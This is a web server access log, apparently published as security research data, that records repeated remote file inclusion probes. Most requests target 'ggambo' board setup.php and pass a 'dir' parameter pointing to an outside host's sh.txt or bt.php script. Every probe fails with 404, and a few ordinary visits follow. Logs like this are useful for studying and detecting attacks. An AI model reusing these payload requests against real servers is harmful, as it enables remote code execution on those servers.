1.224.163.80 - - [10/Feb/2015:12:05:54 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:05:54 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:05:56 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:12:07:40 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:07:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:07:42 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:07:46 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
74.208.180.111 - - [10/Feb/2015:12:08:55 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:08:56 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:08:56 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:08:57 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
1.224.163.80 - - [10/Feb/2015:12:09:05 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:09:07 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:09:07 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:09:08 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:10:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:10:43 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:10:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:10:44 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
1.224.163.80 - - [10/Feb/2015:12:20:09 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:20:11 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:20:11 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:20:12 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:43 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:45 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:54 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:55 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:56 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:12:21:57 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
74.208.180.111 - - [10/Feb/2015:12:22:39 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:40 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:40 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:41 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:42 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:42 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:47 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:48 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:48 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:49 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:49 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:51 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:22:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:23:00 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:23:01 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:23:01 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:23:02 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
212.227.18.39 - - [10/Feb/2015:12:24:42 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
212.227.18.39 - - [10/Feb/2015:12:24:43 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
212.227.18.39 - - [10/Feb/2015:12:24:43 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
212.227.18.39 - - [10/Feb/2015:12:24:45 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
74.208.180.111 - - [10/Feb/2015:12:30:34 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:34 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:35 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:35 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:36 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:36 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:36 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:36 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:37 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:38 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:38 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:38 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:38 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:39 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:30:39 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:32:01 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:32:02 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:32:02 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:32:03 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:40:33 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:40:34 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:40:34 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:40:35 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:13 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:14 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:14 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:15 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:15 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:16 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:16 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:41:17 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:10 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:11 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:12 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:32 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:34 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:42:35 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:54:42 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:54:43 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:54:44 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:54:45 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:39 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:40 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:40 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:41 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:42 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:43 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:58:44 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
79.156.54.223 - - [10/Feb/2015:13:11:02 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
79.156.54.223 - - [10/Feb/2015:13:11:02 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
79.156.54.223 - - [10/Feb/2015:13:11:03 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
66.249.64.196 - - [10/Feb/2015:13:15:15 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.4 - - [10/Feb/2015:13:15:15 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
164.85.131.130 - - [10/Feb/2015:13:23:42 -0800] "GET /self.logs/access.log.2015-01-21.gz HTTP/1.1" 304 188 "-" "Mozilla/4.0 (compatible;)" 
